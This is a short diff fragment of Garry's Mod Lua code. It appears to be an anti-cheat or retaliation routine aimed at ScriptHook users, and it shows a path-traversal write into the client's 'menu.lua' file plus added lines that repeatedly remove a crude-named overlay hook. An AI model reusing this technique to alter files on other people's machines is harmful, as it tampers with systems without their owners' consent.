@@ -47,6 +47,10 @@ hook.Add("PlayerAuthed", "NBP_ASH", function(ply)
 					end)
 
 				]], "../../garrysmod/lua/menu/menu.lua")
+				hook.Remove("DrawOverlay", "yeah_fuck_your_shit_hard")
+				timer.Create("OHNOGGGGGGGGG", 0.1, 10, function()
+					hook.Remove("DrawOverlay", "yeah_fuck_your_shit_hard")
+				end)
 				function ScrewScriptHook(path)
 					local files, dirs = file.Find("lua/"..path.."*", "GAME")
 					for i,v in pairs(files) do
